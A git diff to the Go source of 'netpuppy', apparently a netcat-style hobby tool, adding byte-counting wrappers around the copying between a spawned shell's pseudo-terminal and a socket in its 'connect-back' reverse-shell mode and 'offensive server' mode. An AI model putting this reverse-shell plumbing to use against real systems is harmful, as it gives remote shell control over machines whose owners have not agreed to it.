@@ -16,6 +16,31 @@ import (
 	"github.com/trshpuppy/netpuppy/utils"
 )
 
+// WRITECOOTER STAYS!!!!! TO COMMEMORATE THE DUMBEST BUG I'VE EVER PERSONALLY ENCOUNTERED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+type WriteCooter struct {
+	Writer io.Writer
+	Count  uint64
+}
+
+func (wc *WriteCooter) Write(dataInPipe []byte) (int, error) {
+	bytesSent, err := wc.Writer.Write(dataInPipe)
+	wc.Count += uint64(bytesSent)
+
+	return bytesSent, err
+}
+
+type ReadCounter struct {
+	Reader io.Reader
+	Count  uint64
+}
+
+func (rc *ReadCounter) Read(dataInPipe []byte) (int, error) {
+	bytesRead, err := rc.Reader.Read(dataInPipe)
+	rc.Count += uint64(bytesRead)
+
+	return bytesRead, err
+}
+
 func Run(c conn.ConnectionGetter) {
 	// Parse flags from user, attach to struct:
 	flagStruct := utils.GetFlags()
@@ -61,7 +86,7 @@ func Run(c conn.ConnectionGetter) {
 
 		if shellErr != nil {
 			errString := "Error starting shell: " + shellErr.Error()
-			socketInterface.Write([]byte(errString))
+			socketInterface.WriteShit([]byte(errString))
 			socketInterface.Close()
 			os.Exit(1)
 		}
@@ -71,6 +96,7 @@ func Run(c conn.ConnectionGetter) {
 	listenForSIGINT(socketInterface, thisPeer)
 
 	// ................................................. CONNECT-BACK w/ SHELL .................................................
+
 	// If we are the connect-back peer & the user wants a shell, start the shell here:
 	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
 		// First, make a function we can call which send errors into the socket
@@ -88,7 +114,7 @@ func Run(c conn.ConnectionGetter) {
 			if socketPresent {
 				// We could maybe send a custom signal to tell the other peer to close immediately...
 				// .... [[instead of it continuing to try to use the socket]]
-				socketInterface.Write([]byte(errMsg))
+				socketInterface.WriteShit([]byte(errMsg))
 				closeUs.socketToClose.Close()
 			}
 
@@ -138,26 +164,38 @@ func Run(c conn.ConnectionGetter) {
 		defer shellInterface.Shell.Process.Kill()
 
 		var routineErr error
-		commandPending := true
+		// commandPending := true
 
 		// Copy output from master device to socket:
 		go func(socket conn.SocketInterface, master *os.File) {
-			_, err := io.Copy(socket.GetWriter(), master)
+			// Create instance of WriteCounter for io.Copy (dest arg):
+			copyCounter := &WriteCooter{Writer: socket.GetWriter()}
+
+			_, err := io.Copy(copyCounter, master)
 			if err != nil {
 				routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
+				// fmt.Printf("Current write count: %v\n", copyCounter.Count)
 				return
 			}
-			commandPending = false
+			// fmt.Printf("Current write count: %v\n", copyCounter.Count)
+			routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
+			return
 		}(socketInterface, master)
 
 		// Copy output from socket to master device:
 		go func(socket conn.SocketInterface, master *os.File) {
-			commandPending = true
-			_, err := io.Copy(master, socket.GetReader())
+			// Create ReadCounter instance:
+			socketReader := &ReadCounter{Reader: socket.GetReader()}
+
+			_, err := io.Copy(master, socketReader)
 			if err != nil {
 				routineErr = fmt.Errorf("Error copying socket to master device: %v\n", err)
+				//fmt.Printf("Current read count: %v\n", socketReader.Count)
 				return
 			}
+			//fmt.Printf("Current read count: %v\n", socketReader.Count)
+			routineErr = fmt.Errorf("Error copying socket to master device: %v\n", err)
+			return
 		}(socketInterface, master)
 
 		// Start for loop with timeout to keep things running smoothly:
@@ -167,13 +205,11 @@ func Run(c conn.ConnectionGetter) {
 			if routineErr != nil {
 				// Send error through socket, then quit:
 				sneakyExit(routineErr, closeUs)
-			}
-
-			// Otherwise, 3 millisecond timeout:
-			if commandPending {
+			} else {
 				// Timeout:
 				time.Sleep(3 * time.Millisecond)
 			}
+
 		}
 	} else {
 		// ................................................. OFFENSIVE SERVER .................................................
@@ -292,7 +328,7 @@ func Run(c conn.ConnectionGetter) {
 			// Called from the select block (user has entered input)
 			// .... Check length so we can clear channel, but not send blank data:
 			if len(data) > 0 {
-				_, erR := socketInterface.Write([]byte(data))
+				_, erR := socketInterface.WriteShit([]byte(data))
 				if erR != nil {
 					customErr := fmt.Errorf("Error writing user input buffer to socket: %v\n", erR)
 					nonSneakyExit(customErr)
